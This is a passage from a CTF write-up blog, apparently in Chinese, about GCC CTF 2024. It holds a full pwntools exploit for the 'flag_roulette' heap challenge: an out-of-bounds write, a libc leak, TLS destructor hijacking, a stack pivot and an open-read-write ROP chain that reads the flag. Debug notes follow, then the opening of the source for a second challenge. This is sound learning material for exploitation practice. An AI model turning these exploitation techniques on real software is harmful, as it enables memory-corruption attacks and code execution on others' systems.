<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./flag_roulette</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x1709
b * __call_tls_dtors
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">):</span>
    <span class="n">part1</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
    <span class="n">part1</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">part2</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">-</span> <span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">part1</span> <span class="o">+</span> <span class="n">part2</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">How many bytes would you like to bet on ?</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="c1"># 0x7f ~ 0x21000
</span>    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please choose the index of the byte to modify</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please set the new value of this byte</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">rm</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_b</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="nf">rm</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">write_Q</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">heap_ptr</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">heap_ptr</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="nf">write_b</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>



<span class="c1"># OOB
</span><span class="nf">write_b</span><span class="p">(</span><span class="mh">0x1f8398</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>




<span class="sh">'''</span><span class="s">
libc leak
</span><span class="sh">'''</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mh">0x1f9798</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1923632</span>
<span class="n">tls_base</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mi">10432</span>
<span class="n">heap_ptr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x24ff0</span>

<span class="nf">rm</span><span class="p">()</span>

<span class="n">magic_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000099ab4</span>

<span class="c1"># rop base = tls_base + 0x60
</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">1914944</span> <span class="o">+</span> <span class="mi">8</span>
<span class="n">rbp</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">+</span> <span class="mh">0x60</span>
<span class="nf">write_Q</span><span class="p">(</span><span class="n">rsi</span><span class="p">,</span><span class="n">rbp</span><span class="p">)</span>

<span class="c1"># col rax
</span><span class="n">rbx</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">-</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="mh">0x40</span>
<span class="n">rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000004e3b9</span> <span class="c1"># leave; ret;
</span><span class="nf">write_Q</span><span class="p">(</span><span class="n">rbx</span><span class="p">,</span><span class="n">rax</span><span class="p">)</span>


<span class="n">rop_base</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">+</span> <span class="mh">0x68</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>

<span class="n">rax</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rsi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>


<span class="n">read_rop</span> <span class="o">=</span><span class="p">[</span>
    <span class="n">rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">rsi</span><span class="p">,</span> <span class="n">rop_base</span><span class="o">+</span><span class="mh">0x48</span><span class="p">,</span>
    <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span>
    <span class="n">syscall</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">read_rop</span><span class="p">)):</span>
    <span class="nf">write_Q</span><span class="p">(</span><span class="n">rop_base</span><span class="o">+</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">),</span><span class="n">read_rop</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>



<span class="c1"># clear random values
</span><span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">)</span>

<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">tls_base</span><span class="o">-</span><span class="mh">0x48</span><span class="p">)</span>
<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x48</span><span class="p">,</span> <span class="nf">rol</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">,</span><span class="mh">0x11</span><span class="p">))</span>
<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x44454647</span><span class="p">)</span>




<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io,gdbscript)
</span>

<span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">pause</span><span class="p">()</span>

<span class="n">orw_rop_addr</span> <span class="o">=</span> <span class="n">rop_base</span><span class="o">+</span><span class="mh">0x48</span>

<span class="n">orw_rop</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">orw_rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span>
<span class="n">orw_rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
<span class="n">orw_rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">orw_rop</span><span class="p">)</span>


<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>调试</li>
</ul>

<p>‍</p>

<p>​<code class="language-plaintext highlighter-rouge">call rax</code>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195132-k3dxvxf.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195132-k3dxvxf.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>执行 magic gadget部分已经成功修改 rax 和 rbp ,</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195208-rah0e5d.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195208-rah0e5d.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>然后 call rax ,执行 leave 进行栈迁移</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195241-hn3yveo.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195241-hn3yveo.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195254-f4ogtew.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195254-f4ogtew.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>执行一个 read，把ORW 操作部分的 rop 读到当前栈上</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195408-a1elmtz.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195408-a1elmtz.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>ORW 部分</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195544-fmq1k2m.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195544-fmq1k2m.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195635-t6bofbw.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310195635-t6bofbw.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>至此结束，总之学到了不少东西，一开始不会，跟着大佬的wp solve</p>

<blockquote>
  <p>mp_ 结构体的一些作用，一些关于malloc 和 free 的部分知识</p>

  <p>一些ROPgadget 找不到，而 ropper 可以找到的gadget</p>
</blockquote>

<p>‍</p>

<h3 id="end"><span class="me-2">END</span><a href="#end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>参考大佬的博客地址</li>
</ul>

<pre><code class="language-url">https://chovid99.github.io/posts/gcc-ctf-2024/
</code></pre>

<p>🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>下面俩题 没啥可看的</li>
</ul>

<p>‍</p>

<h2 id="cuttin_string"><span class="me-2">Cuttin_String</span><a href="#cuttin_string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>这题不是很难所以就随便写写</p>

<ul>
  <li>源码</li>
</ul>

<div class="language-armasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Armasm"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
</pre></td><td class="rouge-code"><pre><span class="nl">BITS</span> <span class="err">64</span>
<span class="c">; -------------------------------------------------------</span>
<span class="c">; STATIC VARIABLES</span>

<span class="nl">section</span> <span class="err">.</span><span class="nb">rdata</span>

<span class="c">; //// [Banner messages] ////</span>
<span class="nl">main_message</span> <span class="nb">db</span> <span class="mi">10</span><span class="o">,</span><span class="s2">"Cuttin'String, the smallest string cutting tool"</span><span class="o">,</span><span class="mi">10</span><span class="o">,</span><span class="s2">"-----------------------------------------------"</span><span class="o">,</span><span class="mi">10</span><span class="o">,</span> <span class="mi">0</span>
<span class="nl">len_str_message</span> <span class="nb">db</span> <span class="s2">"Enter the length of the string (in decimal) &gt; "</span><span class="o">,</span> <span class="mi">0</span>
<span class="nl">inp_str_message</span> <span class="nb">db</span> <span class="s2">"Enter the string to cut &gt; "</span><span class="o">,</span> <span class="mi">0</span>
<span class="nl">delimiter_message</span> <span class="nb">db</span> <span class="mi">10</span><span class="o">,</span><span class="mi">10</span><span class="o">,</span><span class="s2">"---"</span><span class="o">,</span><span class="mi">10</span><span class="o">,</span><span class="mi">0</span>

<span class="c">; //// [Error messages] ////</span>
<span class="nl">error_msg_not_int</span> <span class="nb">db</span> <span class="s2">"Error. Enter a number in decimal."</span><span class="o">,</span><span class="mi">10</span><span class="o">,</span><span class="mi">0</span>

<span class="c">; -------------------------------------------------------</span>
<span class="c">; ASM CODE :)</span>

<span class="nl">section</span> <span class="err">.</span><span class="nb">text</span>
<span class="nl">global</span> <span class="nf">_start</span>

<span class="c">; //// [Utils] ////</span>

<span class="c">; @Type: Macro</span>
<span class="c">; Prepare sys_read syscall</span>
<span class="nl">__LOAD_SYS_READ</span><span class="err">:</span>
	<span class="nb">xor</span> <span class="nv">rax</span><span class="o">,</span> <span class="nv">rax</span>
	<span class="nb">ret</span>

<span class="c">; @Type: Macro</span>
<span class="c">; Prepare sys_write syscall</span>
<span class="nl">__LOAD_SYS_WRITE</span><span class="err">:</span>
	<span class="nb">xor</span> <span class="nv">rax</span><span class="o">,</span> <span class="nv">rax</span>
	<span class="nb">mov</span> <span class="nv">rdi</span><span class="o">,</span> <span class="mi">1</span>
	<span class="nb">inc</span> <span class="nb">al</span>
	<span class="nb">ret</span>

<span class="c">; @Type: Function</span>
<span class="c">; @Quick: _PUTS(str*, len=0)</span>
<span class="c">; @Desc: Print the given string in stdout</span>
<span class="c">; 		 If len is not 0, display len bytes of str</span>
<span class="c">; 		 Else, it continues until reaching a null-byte</span>
<span class="nl">_PUTS</span><span class="err">:</span>
	<span class="c">; Setup stack frame</span>
	<span class="nb">push</span> <span class="nv">rbp</span>
	<span class="nb">mov</span> <span class="nv">rbp</span><span class="o">,</span> <span class="nv">rsp</span>

	<span class="c">; Get the arguments</span>
	<span class="nb">mov</span> <span class="nv">rsi</span><span class="o">,</span> <span class="o">[</span><span class="nv">rsp</span><span class="o">+</span><span class="mi">24</span><span class="o">]</span> <span class="c">; ptr*</span>
	<span class="nb">mov</span> <span class="nv">rdx</span><span class="o">,</span> <span class="o">[</span><span class="nv">rsp</span><span class="o">+</span><span class="mi">16</span><span class="o">]</span> <span class="c">; len</span>

	<span class="c">; Check if len parameter is passed</span>
	<span class="nb">test</span> <span class="nv">rdx</span><span class="o">,</span> <span class="nv">rdx</span>
	<span class="nb">jne</span> <span class="nv">skip_determine_len</span>

<span class="nl">find_null_byte_index</span><span class="err">:</span>
	<span class="nb">mov</span> <span class="nb">al</span><span class="o">,</span> <span class="nv">rsi</span><span class="o">[</span><span class="nv">rdx</span><span class="o">]</span>
	<span class="nb">inc</span> <span class="nv">rdx</span>
	<span class="nb">cmp</span> <span class="nb">al</span><span class="o">,</span> <span class="mi">0</span>
	<span class="nb">jne</span> <span class="nv">find_null_byte_index</span>

<span class="nl">skip_determine_len</span><span class="err">:</span>
	<span class="c">; PRINT the string</span>
	<span class="nb">call</span> <span class="nv">__LOAD_SYS_WRITE</span>
	<span class="nb">dec</span> <span class="nv">rdx</span>
	<span class="nb">syscall</span>
	<span class="nb">leave</span>
	<span class="nb">ret</span>

<span class="c">; @Type: Function</span>
<span class="c">; @Quick: _read_and_print_str(len)</span>
<span class="c">; @Desc: Read str from stdin and print the len first bytes to stdout</span>
<span class="nl">_read_and_print_str</span><span class="err">:</span>
	<span class="c">; Setup stack frame</span>
	<span class="nb">push</span> <span class="nv">rbp</span>
	<span class="nb">mov</span> <span class="nv">rbp</span><span class="o">,</span> <span class="nv">rsp</span>

	<span class="c">; Get len argument</span>
	<span class="nb">mov</span> <span class="nv">r10</span><span class="o">,</span> <span class="o">[</span><span class="nv">rsp</span><span class="o">+</span><span class="mi">16</span><span class="o">]</span> <span class="c">; len</span>

	<span class="c">; Allocate stack buffer of 512 bytes</span>
	<span class="nb">sub</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">512</span>

	<span class="c">; Read 0x512 bytes from stdin</span>
	<span class="nb">call</span> <span class="nv">__LOAD_SYS_READ</span>
	<span class="nb">xor</span> <span class="nv">rdi</span><span class="o">,</span> <span class="nv">rdi</span>
	<span class="nb">mov</span> <span class="nv">rsi</span><span class="o">,</span> <span class="nv">rsp</span>
	<span class="nb">mov</span> <span class="nv">rdx</span><span class="o">,</span> <span class="mh">0x512</span>
	<span class="nb">syscall</span>

	<span class="c">; Print the string cutted</span>
	<span class="nb">push</span> <span class="nv">rsi</span> <span class="c">; Str</span>
	<span class="nb">push</span> <span class="nv">r10</span> <span class="c">; len</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">8</span>

	<span class="c">; Return from function</span>
	<span class="nb">leave</span>
	<span class="nb">ret</span>

<span class="c">; @Type: Function</span>
<span class="c">; @Quick: _get_len_str(void) -&gt; len:r10</span>
<span class="c">; @Desc: Reads decimal from stdin and convert it to usable number.</span>
<span class="nl">_get_len_str</span><span class="err">:</span>
	<span class="c">; Setup stack frame</span>
	<span class="nb">push</span> <span class="nv">rbp</span>
	<span class="nb">mov</span> <span class="nv">rbp</span><span class="o">,</span> <span class="nv">rsp</span>

	<span class="c">; Allocate 8 bytes buffer</span>
	<span class="nb">sub</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">8</span>

	<span class="c">; Read 8 bytes from stdin</span>
	<span class="nb">call</span> <span class="nv">__LOAD_SYS_READ</span>
	<span class="nb">xor</span> <span class="nv">rdi</span><span class="o">,</span> <span class="nv">rdi</span>
	<span class="nb">mov</span> <span class="nv">rsi</span><span class="o">,</span> <span class="nv">rsp</span>
	<span class="nb">mov</span> <span class="nv">rdx</span><span class="o">,</span> <span class="mi">8</span>
	<span class="nb">syscall</span>

	<span class="c">; Prepare str to int</span>
	<span class="nb">xor</span> <span class="nv">r10</span><span class="o">,</span> <span class="nv">r10</span>	<span class="c">; Reset output</span>
	<span class="nb">xor</span> <span class="nv">rcx</span><span class="o">,</span> <span class="nv">rcx</span> 	<span class="c">; Reset counter</span>

	<span class="c">; Perform str to int by looping through each digit</span>
<span class="nl">loop_over_digits</span><span class="err">:</span>
